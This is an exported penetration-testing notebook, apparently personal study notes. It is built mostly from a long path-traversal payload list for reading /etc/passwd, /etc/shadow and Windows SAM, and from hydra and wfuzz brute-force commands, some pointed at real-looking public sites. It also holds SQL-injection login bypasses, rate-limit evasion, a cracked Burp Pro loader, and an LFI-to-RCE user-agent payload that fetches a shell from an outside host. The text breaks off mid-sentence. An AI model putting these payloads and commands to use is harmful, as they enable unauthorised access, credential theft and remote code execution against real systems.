Group\Apache\logs\error.log</p><p>../../../../../apache/logs/access.log</p><p>../../../../apache/logs/access.log</p><p>../../../apache/logs/access.log</p><p>../../apache/logs/access.log</p><p>../apache/logs/access.log</p><p>/apache/logs/error_log</p><p>/apache/logs/error.log</p><p>../../../../../apache/logs/error.log</p><p>../../../../apache/logs/error.log</p><p>../../../apache/logs/error.log</p><p>../../apache/logs/error.log</p><p>../apache/logs/error.log</p><p>/apache\php\php.ini</p><p>/etc/httpd/logs/acces_log </p><p>/etc/httpd/logs/error_log </p><p>/var/www/logs/access_log </p><p>/var/www/logs/access.log </p><p>/usr/local/apache/logs/access_ log </p><p>/usr/local/apache/logs/access. log </p><p>/var/log/apache/access_log</p><p>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/..//etc/passwd</p><p>/var/log/apache2/access_log </p><p>/var/log/apache/access.log </p><p>/var/log/apache2/access.log</p><p>/var/log/access_log</p><p>\\&amp;apos;/bin/cat%20/etc/passwd\\&amp;apos;</p><p>\\&amp;apos;/bin/cat%20/etc/shadow\\&amp;apos;</p><p>/.bash_history</p><p>/.bash_profile</p><p>/.bashrc</p><p>../../../../../../../../../root/.bash_history</p><p>/bin/php.ini</p><p>/boot/grub/grub.conf</p><p>/./././././././././././boot.ini</p><p>/../../../../../../../../../../../boot.ini</p><p>/../../../../../../../../../../../boot.ini%00</p><p>../../../../../../../../../usr/bin/whoami</p><p>../../../../../../../../../bin/whoami</p><p>../../../../../../../../../usr/bin/whoami%00</p><p>../../../../../../../../../bin/whoami%00</p><p>....//....//....//....//....//....//....//....//....//bin/whoami%00</p><p>....//....//....//....//....//....//....//....//....//usr/bin/whoami%00</p><p>//..//..//..//..//..//..//..//..//..//etc/passwd%00</p><p>....//....//....//....//....//....//....//....//....//bin/hostname</p><p>....//....//....//....//....//....//....//....//....//bin/id</p><p>....//....//....//....//....//....//....//....//....//etc/passwd</p><p>/....//....//....//....//....//....//....//....//....//....//etc/shadow%00</p><p>....%5c....%5c....%5c....%5c....%5c....%5c....%5c....%5cetc%5cpasswd</p><p>....%5c....%5c....%5c....%5c....%5c....%5c....%5c....%5cvar%5clog%5capache2%5caccess_log</p><p>/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd</p><p>/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/shadow</p><p>../../../../../proc/self/environ</p><p>../../../../../etc/hosts</p><p>../../../../../etc/issue</p><p>../../../../../etc/motd</p><p>//index.php?page=../../../../../../../etc/passwd</p><p>?page=php://filter/convert.base64-encode/resource=../../../../../etc/passwd</p><p>?page=/etc/passwd</p><p>//../../../../../../../../../../../../../../../../etc/passwd</p><p>../../../../../etc/passwd%00...........................................</p><p>../../../boot.ini%00</p><p>../../../WINDOWS/system32/drivers/etc/hosts</p><p>../../../windows/system32/config/sam</p><p>../../../etc/security/passwd</p><p>/..;/.;/.;/.;/etc/passwd</p><p>....//....//....//....//....//....//....//var/log/auth.log</p><p>%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/issue</p><p>%252e%252e/%252e%252e/%252e%252e/%252e%252e/proc/self/environ</p><p>%00../../../../../../etc/nsswitch.conf</p><p>//../../../../etc/passwd#</p><p>../../../../etc/hosts%00--</p><p>../../../../../../../../../etc/aliases</p><p>%00../../../../../../etc/group</p><p>../../../../../boot.ini%00</p><p>%c0%af%c0%af%c0%af/etc/shadow</p><p>....//....//....//....//....//....//....//....//....//.bash_logout</p><p>../../../../../../../../../../../etc/group</p><p>../../../../../../../../../../../etc/sudoers</p><p>%5c..%5c..%5c..%5c..%5c/etc/ssh/sshd_config</p><p>../../../etc/apache2/apache2.conf%00</p><p>../../../etc/httpd/conf/httpd.conf%00</p><p>../../../../../../../../../var/log/messages</p><p>../etc/httpd/conf.d/vhosts.conf</p><p>../usr/local/etc/php.ini</p><p>/etc/cron.d/cronjobs</p><p>../../../../../../../../../.ssh/known_hosts</p><p>phar:///etc/passwd</p><p>//..%252f..%252f..%252f..%252fetc%252fpasswd</p><p>/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/shadow</p><p>/%c0%af%c0%af%c0%af%c0%af/etc/passwd</p><p>//etc/passwd%0a.php</p><p>//....%2f%00../etc/passwd</p><p>/....%2e/%00%2e%2e/etc/passwd</p><p>....//....//....%00..//....//etc/passwd</p><p>//etc/passwd.......</p><p>/etc/passwd;</p><p>/etc/passwd.;</p><p>/etc/passwd%00;</p><p>..%25%5c..%25%5c..%25%5c..%25%5c/etc/shadow</p><p>/etc/passwd%2500</p><p>%00../../../../../../boot.ini</p><p>....%255c....%255c....%255c....%255c/etc/passwd</p><p>/%00/etc/passwd%00</p><p>/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/boot.ini</p><p>/%c0%af%c0%af%c0%af/etc/shadow</p><p>../../../../../../../../WINDOWS/system32/config/system</p><p>../../../../../../../../../etc/samba/smb.conf</p><p>../../../../../../../../../etc/cron.d/cron.allow</p><p>../../../../../../../../../etc/mysql/my.cnf</p><p>../../../../../../../../../etc/rc.local</p><p>../../../../../php.ini</p><p>../../../../../../../../../bin/env</p><p>%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e/etc/group</p><p>/%5c%5c%5c%5c%5c/etc/passwd</p><p>/%5c%5c%5c%5c%5c/etc/shadow</p><p>/%c0%ae/%c0%ae/%c0%ae/%c0%ae/etc/shadow</p><p>/%2e%2e%5c%2e%2e%5c%2e%2e/etc/group</p><p>/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/hostname</p><p>//index.php?page=../../../../../../../../../etc/motd</p><p>/admin.php?page=php://filter/convert.base64-encode/resource=../../../../../../etc/passwd</p><p>../../../../../usr/local/etc/httpd.conf</p><p>../../../../../usr/local/apache2/conf/httpd.conf</p><p>../%255c../%255c../%255c../%255c/etc/issue</p><p>../%255c../%255c../%255c../%255c/proc/self/environ</p><p>../../../../../var/spool/mail/root</p><p>../../../../../var/log/faillog</p><p>../../../../../etc/pam.conf</p><p>../../../../../etc/security/limits.conf</p><p>../../../../../etc/bash.bashrc</p><p>../../../../../etc/apt/sources.list</p><p>%252e%252e/%252e%252e/%252e%252e/%252e%252e/var/log/messages</p><p>/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/ssh/sshd_config</p><p>/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/default/passwd</p><p>../../../../../etc/profile.d/custom.sh</p><p>../../../../../var/run/docker.sock</p><p>%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/fstab</p><p>../../../../../../../../../etc/shells</p><p>/%c0%ae/%c0%ae/%c0%ae/%c0%ae/boot.ini</p><p>../../../../../etc/gshadow</p><p>../../../../../var/log/mail.log</p><p>%25%2fetc%2fpasswd%00</p><p>../../../../../boot/grub/menu.lst</p><p>file:/etc/passwd?/</p><p>file:/etc/passwd%3F/</p><p>file:/etc%252Fpasswd/</p><p>file:/etc%252Fpasswd%3F/</p><p>file:///etc/?/../passwd</p><p>file:///etc/%3F/../passwd</p><p>file:${br}/et${u}c/pas${te}swd?/</p><p>file:$(br)/et$(u)c/pas$(te)swd?/</p><p>/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini</p></div><div class='page'><a name="-Enumeration--Initial_Recon--General_methodology--Content_Discovery--Automation_workflow--Automation_Scripts_and_Oneliners--Vulnscans_725.html"></a><h1 class='title level-8'>Vulnscans</h1><br/></div><div class='page'><a name="ial_Recon--General_methodology--Content_Discovery--Automation_workflow--Automation_Scripts_and_Oneliners--Vulnscans--Recon_automation_731.html"></a><h1 class='title level-9'>Recon automation</h1><br/><p><span style="color:#3f4043;">Finding subdomains and filtering out dead ones: (the rustscan wont work properly over tor)</span></p><p>subfinder -d tesla.com -o subdomains.txt &amp;&amp; cat subdomains.txt | httpx -status-code -cdn | tee alive_hosts.txt</p><p><span style="color:#3f4043;">Check for CVEs and vulns with nuclei:</span></p><p>nuclei -u https://www.example.com -t /opt/nuclei-templates/exposures/ -t /opt/nuclei-templates/cves/ -t /opt/nuclei-templates/vulnerabilities/ -t /opt/nuclei-templates/fuzzing/ -t /opt/nuclei-templates/misconfiguration/ -t /opt/nuclei-templates/technologies/</p><p></p><p></p><p><span style="color:#3f4043;">Fingerprint cdn/waf and  technology stack:</span></p><p>cat URL.txt| httpx -cdn -td</p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--General_methodology--Login_Forms_145.html"></a><h1 class='title level-5'>Login Forms</h1><br/></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--General_methodology--Login_Forms--Checklist_258.html"></a><h1 class='title level-6'>Checklist</h1><br/><p>Try:</p><p><ul><li>Userenum</li><li>Password bruteforce</li><li>SQLI</li><li>Reset password</li><li>Look for API calls in background</li><li>Bypass bruteforce protection</li></ul></p><p></p><p></p><p>&#39; or 1=1 --</p><p>admin&#39;  or 1=1 or &#39;&#39;=&#39;</p><p><a href="https://github.com/payloadbox/sql-injection-payload-list#sql-injection-auth-bypass-payloads">https://github.com/payloadbox/sql-injection-payload-list#sql-injection-auth-bypass-payloads</a></p><p></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--General_methodology--Login_Forms--SQLI_536.html"></a><h1 class='title level-6'>SQLI</h1><br/><p></p><p>Fuzzing SQLI:</p><p></p><p><a href="https://github.com/payloadbox/sql-injection-payload-list#sql-injection-auth-bypass-payloads">https://github.com/payloadbox/sql-injection-payload-list#sql-injection-auth-bypass-payloads</a></p><p></p><p>&#39; or 1=1 --</p><p>admin&#39;  or 43=43 or &#39;&#39;=&#39;</p><p><img src="images/536-1.png" alt="images/536-1.png" /></p><p></p><p><img src="images/536-2.png" alt="images/536-2.png" /></p><p></p><p><img src="images/536-3.png" alt="images/536-3.png" />`</p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--General_methodology--Login_Forms--Zap_Bruteforcing_146.html"></a><h1 class='title level-6'>Zap Bruteforcing</h1><br/><p><span style="color:#234141;">Just send a post request and fuzz the password. Look at the fuzzing history and look for different response header sizes to find what you&#39;re looking for.</span></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--General_methodology--Login_Forms--Hydra_Bruteforcing_147.html"></a><h1 class='title level-6'>Hydra Bruteforcing</h1><br/><p></p><p>We can for instance use hydra like this</p><p></p><p><span style="color:#234141;">(Note: You can get the parameters used from burp suite response when enumerating)</span></p><p></p><p></p><p><span style="color:#234141;">login-form:</span></p><p>hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form &quot;/department/login.php:username=^USER^&amp;password=^PASS^:Invalid Password!&quot; -V -e nsr -f -t 50 -K</p><p></p><p>hydra -l admin -P /usr/share/wordlists/rockyou.txt blissgadgetstore.com http-post-form &quot;/wp-login.php:log=^USER^&amp;password=^PASS^&amp;wp-submit=Log:Error&quot; -V -e nsr -f -t 50 -K -I  </p><p></p><p><span style="color:#234141;">http-get:</span></p><p>hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.54.52 http-get /inferno -V -e nsr -f -t 50 -K</p><p></p><p><span style="color:#234141;">FTP:</span></p><p>hydra -l mark -P /usr/share/wordlists/rockyou.txt 10.10.204.203 ftp -V -e nsr -f -t 50 -K</p><p></p><p><span style="color:#234141;">SSH:</span></p><p>hydra -l mark -P /usr/share/wordlists/rockyou.txt 10.10.204.203 ssh -V -e nsr -f -t 50 -K</p><p></p><p><span style="color:#234141;">IMAP:</span></p><p>hydra -l mark -P /usr/share/wordlists/rockyou.txt 10.10.204.203 imap -V -e nsr -f -t 50 -K</p><p></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--General_methodology--Login_Forms--Hydra_Bruteforcing--asdas_934.html"></a><h1 class='title level-7'>asdas</h1><br/><p>asdadas</p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--General_methodology--Login_Forms--Userenum__wfuzz_225.html"></a><h1 class='title level-6'>Userenum | wfuzz</h1><br/><p><span style="color:#3f4043;">Wfuzz Userenum:</span></p><p></p><p>wfuzz -w /usr/share/seclists/Usernames/Names/names.txt -c -d &quot;log=FUZZ&amp;pwd=anything&quot; <a href="http://10.11.1.251/wp/wp-login.php">http://10.11.1.251/wp/wp-login.php</a></p><p>wfuzz -w /usr/share/seclists/Usernames/Names/names.txt -c --hl 80 -d &quot;log=FUZZ&amp;pwd=anything&quot; <a href="http://10.11.1.251/wp/wp-login.php">http://10.11.1.251/wp/wp-login.php</a></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--General_methodology--Login_Forms--wfuzz_bruteforcing_14.html"></a><h1 class='title level-6'>wfuzz bruteforcing</h1><br/><p><span style="color:#3f4043;">Brute forcing http-post-forms:</span></p><p></p><p>wfuzz -w /usr/share/wordlists/rockyou.txt -c -d &quot;log=admin&amp;pwd=FUZZ&quot; <a href="http://10.11.1.251/wp/wp-login.php">http://10.11.1.251/wp/wp-login.php</a></p><p>wfuzz -w /usr/share/wordlists/rockyou.txt -c --hw 254 -d &quot;log=admin&amp;pwd=FUZZ&quot; <a href="http://10.11.1.251/wp/wp-login.php">http://10.11.1.251/wp/wp-login.php</a></p><p></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--General_methodology--Login_Forms--Bruteforce-rate_limiting_protection_bypass_509.html"></a><h1 class='title level-6'>Bruteforce/rate limiting protection bypass</h1><br/></div><div class='page'><a name="--Enumeration--Initial_Recon--General_methodology--Login_Forms--Bruteforce-rate_limiting_protection_bypass--X-Forwarded-For_technique_524.html"></a><h1 class='title level-7'>X-Forwarded-For technique</h1><br/><p>This technique essentially allows tell the webapp that you are coming from a new IP every time you make a request, possible bypassing protection if it&#39;s doing IP based blocking</p><p></p><p><img src="images/524-1.png" alt="images/524-1.png" /></p><p></p><p>Use pitchfork attacka against it, sequentually changing IP adress as you bruteforce the password as well.</p><p></p></div><div class='page'><a name="meration--Initial_Recon--General_methodology--Login_Forms--Bruteforce-rate_limiting_protection_bypass--Successful_Login_Counter_Reset_525.html"></a><h1 class='title level-7'>Successful Login Counter Reset</h1><br/><p><a href="https://www.youtube.com/watch?v=FzQcu9LYd_k">https://www.youtube.com/watch?v=FzQcu9LYd_k</a></p><p></p><p><span style="color:#3f4043;">One technique you can do (depending on how webapp is setup) is to alternate between valid credentials and incorrect credentials in a bruteforce attack, sometimes allowing you to bruteforce fast without getting rate limited. Sometimes the webapp allows f.ex 3-5 incorrect passwords then you&#39;ll have to wait X amount of time. By going back and forth between valid and invalid credentials, it&#39;s sometimes possible to get around this. </span></p><p></p><p><span style="color:#3f4043;">Script that makes your wordlist match this pattern:</span></p><p><a href="https://github.com/skickar/BashScripting/blob/master/burplist.sh">https://github.com/skickar/BashScripting/blob/master/burplist.sh</a></p></div><div class='page'><a name="logy--Enumeration--Initial_Recon--General_methodology--Login_Forms--Bruteforce-rate_limiting_protection_bypass--2FA_bypass_tehchnique_526.html"></a><h1 class='title level-7'>2FA bypass tehchnique</h1><br/><p><a href="https://youtu.be/OGh5V-BBAOo?t=1055">https://youtu.be/OGh5V-BBAOo?t=1055</a></p><p></p></div><div class='page'><a name="hdology--Enumeration--Initial_Recon--General_methodology--Login_Forms--Bruteforce-rate_limiting_protection_bypass--control_characters_633.html"></a><h1 class='title level-7'>control characters</h1><br/><p><a href="https://www.youtube.com/watch?v=VWJenLtVlk4">https://www.youtube.com/watch?v=VWJenLtVlk4</a></p><p></p><p><a href="#Methdology--random_spam_might_come_handy_idk--ASCII_table_and_encoding_484.html">ASCII table and encoding</a></p><p></p><p>maybe this could work on login or other paramaters too. Something like</p><p></p><p>email=rks@cloud-mail.net&amp;password=FUZZ%0d</p><p>or</p><p>email=rks@cloud-mail.net&amp;password=FUZZ%0d%0a</p><p>or</p><p>email=rks@cloud-mail.net&amp;password=FUZZ%00</p></div><div class='page'><a name="dology--Enumeration--Initial_Recon--General_methodology--Login_Forms--Bruteforce-rate_limiting_protection_bypass--Chinging_CSRF_token_952.html"></a><h1 class='title level-7'>Chinging CSRF token</h1><br/><p>watch 1 min from here: <a href="https://youtu.be/C_Kspt_TjBM?t=3100">https://youtu.be/C_Kspt_TjBM?t=3100</a></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--General_methodology--Burp_Suite_267.html"></a><h1 class='title level-5'>Burp Suite</h1><br/><p>For installation: tryhackme has a nice room on it.</p><p></p><p>/usr/lib/jvm/java-23-openjdk-amd64/bin/java --add-opens=java.desktop/javax.swing=ALL-UNNAMED --add-opens=java.base/java.lang=ALL-UNNAMED --add-opens=java.base/jdk.internal.org.objectweb.asm=ALL-UNNAMED --add-opens=java.base/jdk.internal.org.objectweb.asm.tree=ALL-UNNAMED --add-opens=java.base/jdk.internal.org.objectweb.asm.Opcodes=ALL-UNNAMED -javaagent:burploader.jar -noverify -jar /opt/post/burp/burpsuite_pro_v2023.10.3.7.jar</p><p></p><p></p><p></p><p><h1>Intercept and redirect: </h1><span style="color:#3f4043;">(can be useful with exploit towards web apps if you want more output)</span></p><p></p><p><span style="color:#3f4043;">Burp setup. I used force SSL and redirected port 80 localhost traffic through the server I&#39;m attacking. </span></p><p><img src="images/267-1.png" alt="images/267-1.png" /></p><p></p><p></p><p></p><p><h1>If you want to use Burp Suite to intercept requests through proxychains:</h1></p><p><img src="images/267-2.png" alt="images/267-2.png" /></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--General_methodology--Burp_Suite--Installation_371.html"></a><h1 class='title level-6'>Installation</h1><br/><p><span style="color:#3f4043;">have burp listening, then go here to download cert:</span></p><p><a href="http://burp/cert">http://burp/cert</a></p><p></p><p><span style="color:#3f4043;">next, go to about:preferences in firefox urlbar and search “Certificates”</span></p><p></p><p><span style="color:#3f4043;">then “view certificates”</span></p><p><img src="images/371-1.png" alt="images/371-1.png" /></p><p></p><p><span style="color:#3f4043;">then select our cacert.der certificate, and select OK with this setting:</span></p><p><img src="images/371-2.png" alt="images/371-2.png" /></p><p></p><p><span style="color:#3f4043;">Now, we can proxy through https fine as well! :)</span></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--General_methodology--Burp_Suite--virtual_host_routing_372.html"></a><h1 class='title level-6'>virtual host routing</h1><br/><p><img src="images/372-1.png" alt="images/372-1.png" /></p><p><span style="color:#3f4043;">Under project options</span></p><p><span style="color:#3f4043;">Use this to add subdomains if burp struggles to do DNS with your /etc/hosts </span></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--General_methodology--Burp_Suite--Extensions_516.html"></a><h1 class='title level-6'>Extensions</h1><br/><p>Check out this list:</p><p><a href="https://github.com/snoopysecurity/awesome-burp-extensions">https://github.com/snoopysecurity/awesome-burp-extensions</a></p><p>Get pro:</p><p><a href="https://www.youtube.com/watch?v=N0KQrk77BBo">https://www.youtube.com/watch?v=N0KQrk77BBo</a></p><p><a href="https://github.com/SNGWN/Burp-Suite">https://github.com/SNGWN/Burp-Suite</a></p><p><a href="https://repo1.maven.org/maven2/org/python/jython-standalone/2.7.3/">https://repo1.maven.org/maven2/org/python/jython-standalone/2.7.3/</a></p><p><img src="images/516-1.png" alt="images/516-1.png" /></p><p></p><p>Free:</p><p>Autorize (Detects some authorization vulnerabilities - Useful for IDOR)</p><p><a href="https://portswigger.net/bappstore/f9bbac8c4acf4aefa4d7dc92a991af2f">https://portswigger.net/bappstore/f9bbac8c4acf4aefa4d7dc92a991af2f</a></p><p></p><p>Hunt Scanner - Useful for finding paramters that are frequently vulnerable to any given attack</p><p><a href="https://portswigger.net/bappstore/059343223d094d16a0a8440485bc5c5e">https://portswigger.net/bappstore/059343223d094d16a0a8440485bc5c5e</a></p><p></p><p>Paid:</p><p>Error Message Checks (Logs error messages - Useful for fingerprinting)</p><p><a href="https://portswigger.net/bappstore/4f01db4b668c4126a68e4673df796f0f">https://portswigger.net/bappstore/4f01db4b668c4126a68e4673df796f0f</a></p><p> </p><p>Passive scanning burp extension - Useful for finding new domains etc </p><p><a href="https://portswigger.net/bappstore/d927f0065171485981d6eb49a860fc3e">https://portswigger.net/bappstore/d927f0065171485981d6eb49a860fc3e</a></p><p></p><p>Param Miner - Useful for finding hidden paramaters </p><p><a href="https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943">https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943</a></p><p></p><p>Bypass WAF - Adds some localhost headers to bypass a few WAF solutions</p><p><a href="https://portswigger.net/bappstore/ae2611da3bbc4687953a1f4ba6a4e04c">https://portswigger.net/bappstore/ae2611da3bbc4687953a1f4ba6a4e04c</a></p><p></p><p>Logs shit, idk, try it out</p><p><a href="https://portswigger.net/burp/documentation/desktop/tools/logger">https://portswigger.net/burp/documentation/desktop/tools/logger</a></p><p></p><p>Check out if it&#39;s free or not. Finds paramaters n stuff, seems awesome:</p><p><a href="https://github.com/xnl-h4ck3r/GAP-Burp-Extension">https://github.com/xnl-h4ck3r/GAP-Burp-Extension</a></p><p></p><p>HTTP Request Smuggler</p><p></p><p>Retire.js</p><p>Awesome ones I&#39;ve tested:</p><p>Hackvertor</p><p>JSON Web Tokens</p><p>JWT Editor</p><p>Param Miner</p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques_211.html"></a><h1 class='title level-4'>Common Web Attack Techniques</h1><br/></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--Headers_375.html"></a><h1 class='title level-5'>Headers</h1><br/></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--Headers--Cookies_418.html"></a><h1 class='title level-6'>Cookies</h1><br/></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--Headers--Cookies--Cookie_attacks_377.html"></a><h1 class='title level-7'>Cookie attacks</h1><br/><p><span style="color:#3f4043;text-decoration:underline;">Cookie header attacks: </span></p><p></p><p><span style="color:#3f4043;">Can sometimes be used for auth bypassing:</span></p><p>Cookie: SessionToken=anything</p><p></p><p></p><p></p><p></p><p><span style="color:#3f4043;">Just play around with, sometimes the server can expect an LFI even through it, see responses</span></p><p>Cookie: name=&lt;script&gt;alert(document.domain)&lt;/script&gt;</p><p>Cookie: name=../../../../../../../../etc/passwd</p><p>Cookie: name=../../../../../../../../etc/passwd%00</p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--Headers--Cookies--python_jsonpickle_419.html"></a><h1 class='title level-7'>python jsonpickle</h1><br/><p>see symfonos4 box <a href="#Methdology--CTF_Boxes--Vulnhub--symfonos4--notes_415.html">notes</a> to see examle</p><p></p><p><span style="color:#3f4043;">“jsonpickle is a library for the two-way conversion of complex Python objects and JSON”</span></p><p><span style="color:#3f4043;">“jsonpickle is a Python library for serialization and deserialization of complex Python objects to and from JSON.”</span></p><p></p><p>See <a href="#Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--Deserialization_Attacks--python_jsonpickle_493.html">python jsonpickle</a></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--Headers--Host_Injection_475.html"></a><h1 class='title level-6'>Host Injection</h1><br/><p><span style="color:#3f4043;">Host Header Injection:</span></p><p><a href="https://youtu.be/8wT1DWxCOgc?t=1">https://youtu.be/8wT1DWxCOgc?t=1</a></p><p><ol><li>1. <span style="color:#3f4043;">1. Bypass 403 response</span></li></ol><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;">Host: localhost</span><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;"></span><ol><li><span style="color:#3f4043;">Redirect request to alternate site</span></li></ol><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;">Host: bing.com</span><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;"></span><ol><li><span style="color:#3f4043;">Redirect request to alternate site</span></li></ol><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;">Insert:</span><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;">X-Forwarded-Host: bing.com</span><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;"></span><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;">Impact: It can poison the cache of the web application as well as the proxy. When authorized users tries to access the host, the user gets redirected to the alternate domain due to the poisoned cache of the initial webserver.</span></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--LFI-RFi_212.html"></a><h1 class='title level-5'>LFI/RFi</h1><br/><p></p><p><a href="https://gabb4r.gitbook.io/oscp-notes/web-http/lfi-and-rfi/php-wrappers">https://gabb4r.gitbook.io/oscp-notes/web-http/lfi-and-rfi/php-wrappers</a></p><p></p><p><h2>Basic LFI</h2></p><p></p><p><span style="color:#3f4043;">Basic examples: (try with various levels of url encoding)</span></p><p>https://172.31.3.1/forum.chatlogs/chatlogs.php?file=/../../../../../../etc/passwd</p><p>https://172.31.3.1/forum.chatlogs/chatlogs.php?file=/../../../../../../etc/passwd%00</p><p>https://172.31.3.1/forum.chatlogs/chatlogs.php?file=/....//....//....//....//....//etc/passwd</p><p></p><p>https://172.31.3.1/forum.chatlogs/chatlogs.php?file=../../../../../../etc/passwd</p><p>https://172.31.3.1/forum.chatlogs/chatlogs.php?file=../../../../../../etc/passwd%00</p><p>https://172.31.3.1/forum.chatlogs/chatlogs.php?file=....//....//....//....//....//etc/passwd</p><p>https://172.31.3.1/forum.chatlogs/chatlogs.php?file=....//....//....//....//....//etc/passwd%00</p><p></p><p></p><p></p><p></p><p></p><p></p><p><span style="color:#3f4043;">File wrappers:</span></p><p>http://127.0.0.1/DVWA/vulnerabilities/fi/?page=file:///../../../../../../../../etc/passwd</p><p></p><p><span style="color:#3f4043;">LFI fuzzing:</span></p><p>ffuf -c -u &#39;<a href="https://172.31.3.1/forum.chatlogs/chatlogs.php?file=FUZZ'">https://172.31.3.1/forum.chatlogs/chatlogs.php?file=FUZZ&#39;</a> -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -ignore-body</p><p>wfuzz -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -c --hw 183 -u &#39;<a href="http://10.10.122.51/lab5.php?file=FUZZ'">http://10.10.122.51/lab5.php?file=FUZZ&#39;</a></p><p>wfuzz -w /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt -c --hw 183 -u &#39;<a href="http://10.10.122.51/lab5.php?file=FUZZ'">http://10.10.122.51/lab5.php?file=FUZZ&#39;</a></p><p></p><p><span style="color:#3f4043;">LFI Fuzzing through authenticated request:</span></p><p>ffuf -c -u &#39;<a href="http://192.168.1.136/sea.php?file=../../../../../../FUZZ'">http://192.168.1.136/sea.php?file=../../../../../../FUZZ&#39;</a> -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -b &#39;PHPSESSID=russhgsf2b2asdt3rm4jr4o50l&#39; -fl 21<span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;"></span></p><p></p><p></p><p><h2>LFI to RCE example</h2></p><p>source: <a href="https://www.exploit-db.com/papers/12886">https://www.exploit-db.com/papers/12886</a></p><p></p><p><span style="color:#212225;">if you can reach environ, this will likely work </span></p><p><a href="http://www.website.com/view.php?page=../../../../../proc/self/environ">www.website.com/view.php?page=/../../../../../proc/self/environ</a></p><p></p><p><span style="color:#212225;">user agent:</span></p><p>&lt;?system(&#39;wget <a href="http://hack-bay.com/Shells/gny.txt">http://hack-bay.com/Shells/gny.txt</a> -O shell.php&#39;);?&gt;</p><p></p><p><span style="color:#212225;">==</span></p><p></p><p><span style="color:#3f4043;">also something cool you can do in /var/mail/ somewhere where 